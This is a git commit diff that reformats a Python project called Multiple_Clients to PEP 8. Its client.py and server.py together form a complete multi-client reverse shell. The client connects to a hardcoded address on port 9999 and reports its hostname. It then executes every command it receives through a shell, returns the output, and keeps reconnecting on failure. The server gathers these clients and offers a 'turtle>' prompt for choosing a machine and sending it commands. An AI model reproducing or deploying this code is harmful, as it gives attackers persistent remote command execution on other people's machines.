3d3d1f49fb73cf284677286c7cdd255edb6a0a15
Bucky <buckyroberts@gmail.com>
2016-01-07 22:39:56 -0500

    Reformatted code to follow PEP 8 conventions.

--- Multiple_Clients/client.py
+++ Multiple_Clients/client.py
@@ -1,102 +1,86 @@
 import os
-import sys
 import socket
 import subprocess
 import time
 import struct
 
+
 class Client(object):
-  '''
-  '''
 
-  def __init__(self):
-    '''
-    '''
-    self.serverHost = '192.168.1.9'
-    self.serverPort = 9999
-    self.socket = None
+    def __init__(self):
+        # self.serverHost = '192.168.1.9'
+        self.serverHost = '192.168.0.5'
+        self.serverPort = 9999
+        self.socket = None
 
-  def socket_create(self):
-    '''
-Create a socket
-    '''
-    try:
-      self.socket = socket.socket()
-    except socket.error as e:
-      print("Socket creation error" + str(e))
-      return
-
-  def socket_connect(self):
-    '''
-Connect to a remote socket
-    '''
-    try:
-      self.socket.connect((self.serverHost, self.serverPort))
-    except socket.error as e:
-      print("Socket connection error: " + str(e))
-      time.sleep(5)
-      self.socket_connect()
-    try:
-      self.socket.send(str.encode(socket.gethostname()))
-    except socket.error as e:
-      print("Cannot send hostname to server: " + str(e))
-      time.sleep(5) 
-      self.socket_connect()
-    return
-
-  def receive_commands(self):
-    '''
-Receive commands from remote server and run on local machine
-    '''
-    data = self.socket.recv(10)
-    cwd = str.encode(str(os.getcwd()) + '> ')
-    self.socket.send(struct.pack('>I', len(cwd)) + cwd)
-    while True:
-      data = self.socket.recv(20480)
-      if data[:2].decode("utf-8") == 'cd':
+    def socket_create(self):
+        """ Create a socket """
         try:
-          os.chdir(data[3:].decode("utf-8"))
-        except:
-          pass
-      if data[:].decode("utf-8") == 'quit':
+            self.socket = socket.socket()
+        except socket.error as e:
+            print("Socket creation error" + str(e))
+            return
+
+    def socket_connect(self):
+        """ Connect to a remote socket """
+        try:
+            self.socket.connect((self.serverHost, self.serverPort))
+        except socket.error as e:
+            print("Socket connection error: " + str(e))
+            time.sleep(5)
+            self.socket_connect()
+        try:
+            self.socket.send(str.encode(socket.gethostname()))
+        except socket.error as e:
+            print("Cannot send hostname to server: " + str(e))
+            time.sleep(5)
+            self.socket_connect()
+        return
+
+    def receive_commands(self):
+        """ Receive commands from remote server and run on local machine """
+        self.socket.recv(10)
+        cwd = str.encode(str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
+        while True:
+            data = self.socket.recv(20480)
+            if data[:2].decode("utf-8") == 'cd':
+                try:
+                    os.chdir(data[3:].decode("utf-8"))
+                except:
+                    pass
+            if data[:].decode("utf-8") == 'quit':
+                self.socket.close()
+                break
+            if len(data) > 0:
+                try:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = output_bytes.decode("utf-8", errors="replace")
+                    sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+                    self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
+                    print(output_str)
+                except:
+                    # TODO: Error description is lost
+                    output_str = "Command not recognized" + "\n"
+                    self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                    print(output_str)
         self.socket.close()
-        break
-      if len(data) > 0:
-        try:
-          cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-          output_bytes = cmd.stdout.read() + cmd.stderr.read()
-          output_str = output_bytes.decode("utf-8", errors="replace")
-          sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
-          self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
-          print(output_str)
-        except:
-           # TODO: Error description is lost
-           output_str = "Command not recognized" + "\n"
-           self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
-           print(output_str)
-    self.socket.close()
+
 
 def main():
-  '''
-  '''
-  client = Client()
-  client.socket_create()
-  client.socket_connect()
-  try:
-    client.receive_commands()
-  except Exception as e:
-    print('Error in main: ' + str(e))
-    time.sleep(5)
-  client.socket.close()
-  main()
-  
+    client = Client()
+    client.socket_create()
+    client.socket_connect()
+    try:
+        client.receive_commands()
+    except Exception as e:
+        print('Error in main: ' + str(e))
+        time.sleep(5)
+    client.socket.close()
+    main()
 
 
 if __name__ == '__main__':
-  main()
-
-
-
-
-
-
+    main()
--- Multiple_Clients/server.py
+++ Multiple_Clients/server.py
@@ -10,233 +10,215 @@ NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
 
+
 class MultiServer(object):
-  '''
-  '''
 
-  def __init__(self):
-    '''
-    '''
-    self.host = ''
-    self.port = 9999
-    self.socket  = None
-    self.all_connections = []
-    self.all_addresses = []
+    def __init__(self):
+        self.host = ''
+        self.port = 9999
+        self.socket = None
+        self.all_connections = []
+        self.all_addresses = []
 
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+        return
 
-  def registerSignalHandler(self):
-    '''
-    '''
-    signal.signal(signal.SIGINT, self.quitGracefully)
-    signal.signal(signal.SIGTERM, self.quitGracefully)
-    return
+    def quit_gracefully(self):
+        print('\nQuitting gracefully')
+        for conn in self.all_connections:
+            try:
+                conn.close()
+            except Exception as e:
+                print('Could not close connection %s' % str(e))
+                # continue
+        self.socket.close()
+        sys.exit(0)
 
-  def quitGracefully(self, signal=None, frame=None):
-    '''
-    '''
-    print('\nQuitting gracefully')
-    for conn in self.all_connections:
-      try:
-        conn.close()
-      except Exception as e:
-        print('Could not close connection %s' %str(e))
-        # continue
-    self.socket.close()
-    sys.exit(0)
+    def socket_create(self):
+        try:
+            self.socket = socket.socket()
+        except socket.error as msg:
+            print("Socket creation error: " + str(msg))
+            # TODO: Added exit
+            sys.exit(1)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        return
 
-  def socket_create(self):
-    '''
-    '''
-    try:
-      self.socket = socket.socket()
-    except socket.error as e:
-      print("Socket creation error: " + str(msg))
-      # TODO: Added exit 
-      sys.exit(1)
-    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    return
+    def socket_bind(self):
+        """ Bind socket to port and wait for connection from client """
+        try:
+            self.socket.bind((self.host, self.port))
+            self.socket.listen(5)
+        except socket.error as e:
+            print("Socket binding error: " + str(e))
+            time.sleep(5)
+            self.socket_bind()
+        return
 
-  def socket_bind(self):
-    '''
-Bind socket to port and wait for connection from client
-    '''
-    try:
-      self.socket.bind((self.host, self.port))
-      self.socket.listen(5)
-    except socket.error as e:
-        print("Socket binding error: " + str(e))
-        time.sleep(5)
-        self.socket_bind()
-    return
+    def accept_connections(self):
+        """ Accept connections from multiple clients and save to list """
+        for c in self.all_connections:
+            c.close()
+        self.all_connections = []
+        self.all_addresses = []
+        while 1:
+            try:
+                conn, address = self.socket.accept()
+                conn.setblocking(1)
+                client_hostname = conn.recv(1024).decode("utf-8")
+                address = address + (client_hostname,)
+            except Exception as e:
+                print('Error accepting connections: %s' % str(e))
+                # Loop indefinitely
+                continue
+            self.all_connections.append(conn)
+            self.all_addresses.append(address)
+            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
+        return
 
-  def accept_connections(self):
-    '''
-Accept connections from multiple clients and save to list
-    '''
-    for c in self.all_connections:
-      c.close()
-    self.all_connections = []
-    self.all_addresses = []
-    while 1:
-      try:
-        conn, address = self.socket.accept()
-        conn.setblocking(1)
-        client_hostname = conn.recv(1024).decode("utf-8")
-        address = address + (client_hostname,)
-      except Exception as e:
-        print('Error accepting connections: %s' %str(e))
-        # Loop indefinetely
-        continue
-      self.all_connections.append(conn)
-      self.all_addresses.append(address)
-      print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
-    return
+    def start_turtle(self):
+        """ Interactive prompt for sending commands remotely """
+        while True:
+            cmd = input('turtle> ')
+            if cmd == 'list':
+                self.list_connections()
+                continue
+            elif 'select' in cmd:
+                target, conn = self.get_target(cmd)
+                if conn is not None:
+                    self.send_target_commands(target, conn)
+            elif cmd == '':
+                pass
+            else:
+                print('Command not recognized')
+        return
 
-  def start_turtle(self):
-    '''
-Interactive prompt for sending commands remotely
-    '''
-    while True:
-      cmd = input('turtle> ')
-      if cmd == 'list':
-        self.list_connections()
-        continue
-      elif 'select' in cmd:
-        target, conn = self.get_target(cmd)
-        if conn is not None:
-          self.send_target_commands(target, conn)
-      elif cmd == '':
-        pass
-      else:
-        print('Command not recognized')
-    return
+    def list_connections(self):
+        """ List all connections """
+        results = ''
+        for i, conn in enumerate(self.all_connections):
+            try:
+                conn.send(str.encode(' '))
+                conn.recv(20480)
+            except:
+                del self.all_connections[i]
+                del self.all_addresses[i]
+                continue
+            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
+                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
+        print('----- Clients -----' + '\n' + results)
+        return
 
-  def list_connections(self):
-    '''
-List all connections
-    '''
-    results = ''
-    for i, conn in enumerate(self.all_connections):
-      try:
-        conn.send(str.encode(' '))
-        conn.recv(20480)
-      except:
-        del self.all_connections[i]
-        del self.all_addresses[i]
-        continue
-      results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
-    print('----- Clients -----' + '\n' + results)
-    return
+    def get_target(self, cmd):
+        """ Select target client
+        :param cmd:
+        """
+        target = cmd.split(' ')[-1]
+        try:
+            target = int(target)
+        except:
+            print('Client index should be an integer')
+            return None, None
+        try:
+            conn = self.all_connections[target]
+        except IndexError:
+            print('Not a valid selection')
+            return None, None
+        print("You are now connected to " + str(self.all_addresses[target][2]))
+        return target, conn
 
-  def get_target(self, cmd):
-    '''
-Select target client
-    '''
-    target = cmd.split(' ')[-1]
-    try:
-      target = int(target)
-    except:
-      print('Client index should be an integer')
-      return None, None
-    try:
-      conn = self.all_connections[target]
-    except IndexError:
-      print('Not a valid selection')
-      return None, None
-    print("You are now connected to " + str(self.all_addresses[target][2]))
-    return target, conn
+    def read_command_output(self, conn):
+        """ Read message length and unpack it into an integer
+        :param conn:
+        """
+        raw_msglen = self.recvall(conn, 4)
+        if not raw_msglen:
+            return None
+        msglen = struct.unpack('>I', raw_msglen)[0]
+        # Read the message data
+        return self.recvall(conn, msglen)
 
-  def read_command_output(self, conn):
-    '''
-Read message length and unpack it into an integer
-    '''
-    raw_msglen = self.recvall(conn, 4)
-    if not raw_msglen:
-      return None
-    msglen = struct.unpack('>I', raw_msglen)[0]
-    # Read the message data
-    return self.recvall(conn, msglen)
- 
-  def recvall(self, conn, n):
-    '''
-Helper function to recv n bytes or return None if EOF is hit
-    '''
-    #TODO: this can be a static method
-    data = b''
-    while len(data) < n:
-      packet = conn.recv(n - len(data))
-      if not packet:
-        return None
-      data += packet
-    return data
+    def recvall(self, conn, n):
+        """ Helper function to recv n bytes or return None if EOF is hit
+        :param n:
+        :param conn:
+        """
+        # TODO: this can be a static method
+        data = b''
+        while len(data) < n:
+            packet = conn.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data
 
+    def send_target_commands(self, target, conn):
+        """ Connect with remote target client 
+        :param conn: 
+        :param target: 
+        """
+        conn.send(str.encode(" "))
+        cwd_bytes = self.read_command_output(conn)
+        cwd = str(cwd_bytes, "utf-8")
+        print(cwd, end="")
+        while True:
+            try:
+                cmd = input()
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    cmd_output = self.read_command_output(conn)
+                    client_response = str(cmd_output, "utf-8")
+                    print(client_response, end="")
+                if cmd == 'quit':
+                    break
+            except:
+                print("Connection was lost")
+                break
+        del self.all_connections[target]
+        del self.all_addresses[target]
+        return
 
-  def send_target_commands(self, target, conn):
-    '''
-Connect with remote target client
-    '''
-    conn.send(str.encode(" "))
-    cwd_bytes = self.read_command_output(conn)
-    cwd = str(cwd_bytes, "utf-8")
-    print(cwd, end="")
-    while True:
-      try:
-        cmd = input()
-        if len(str.encode(cmd)) > 0:
-          conn.send(str.encode(cmd))
-          cmd_output = self.read_command_output(conn)
-          client_response = str(cmd_output, "utf-8")
-          print(client_response, end="")
-        if cmd == 'quit':
-          break
-      except:
-            print("Connection was lost")
-            break
-    del self.all_connections[target]
-    del self.all_addresses[target]
-    return
 
 def create_workers():
-  '''
-Create worker threads (will die when main exits)
-  '''
-  server = MultiServer()
-  server.registerSignalHandler()
-  for _ in range(NUMBER_OF_THREADS):
+    """ Create worker threads (will die when main exits) """
+    server = MultiServer()
+    server.register_signal_handler()
+    for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work, args=(server,))
         t.daemon = True
         t.start()
-  return
+    return
 
 
 def work(server):
-  '''
-Do the next job in the queue (thread for handling connections, another for sending commands)
-  '''
-  while True:
-    x = queue.get()
-    if x == 1:
-      server.socket_create()
-      server.socket_bind()
-      server.accept_connections()
-    if x == 2:
-      server.start_turtle()
-    queue.task_done()
-  return
+    """ Do the next job in the queue (thread for handling connections, another for sending commands)
+    :param server:
+    """
+    while True:
+        x = queue.get()
+        if x == 1:
+            server.socket_create()
+            server.socket_bind()
+            server.accept_connections()
+        if x == 2:
+            server.start_turtle()
+        queue.task_done()
+    return
+
 
 def create_jobs():
-  '''
-Each list item is a new job
-  '''
-  for x in JOB_NUMBER:
-    queue.put(x)
-  queue.join()
+    """ Each list item is a new job """
+    for x in JOB_NUMBER:
+        queue.put(x)
+    queue.join()
+
 
 def main():
-  '''
-  '''
-  create_workers()
-  create_jobs()
+    create_workers()
+    create_jobs()
+
 
 if __name__ == '__main__':
-  main()
+    main()
